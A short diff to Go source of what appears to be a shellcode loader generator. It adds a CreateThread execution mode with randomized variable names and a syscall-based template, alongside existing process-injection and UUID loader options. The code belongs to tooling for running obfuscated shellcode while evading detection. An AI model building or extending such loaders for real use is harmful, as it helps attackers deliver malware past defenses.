@@ -822,6 +822,8 @@ func Shellcode_Loader_Buff(Exec_Type string, ProcessInjection string, customsysc
 	Shellcode_Loader.Variables["enumerateLoadedModules"] = Cryptor.VarNumberLength(10, 19)
 
 	//CreateThread loader
+	Shellcode_Loader.Variables["CreateThread"] = Cryptor.VarNumberLength(10, 19)
+	Shellcode_Loader.Variables["WaitForSingleObject"] = Cryptor.VarNumberLength(10, 19)
 	Shellcode_Loader.Variables["VirtualAllocEx"] = Cryptor.VarNumberLength(10, 19)
 	Shellcode_Loader.Variables["VirtualProtectEx"] = Cryptor.VarNumberLength(10, 19)
 	Shellcode_Loader.Variables["CreateRemoteThreadEx"] = Cryptor.VarNumberLength(10, 19)
@@ -972,7 +974,9 @@ func Shellcode_Loader_Buff(Exec_Type string, ProcessInjection string, customsysc
 	if Exec_Type == "UUIDFromString" {
 		Structure = Struct.Syscall_UUIDLoader()
 	}
-
+	if Exec_Type == "CreateThread" {
+		Structure = Struct.Syscall_CreateThread()
+	}
 	Shellcode_LoaderTemplate, err := template.New("Shellcode_Loader").Parse(Structure)
 	if err != nil {
 		log.Fatal(err)
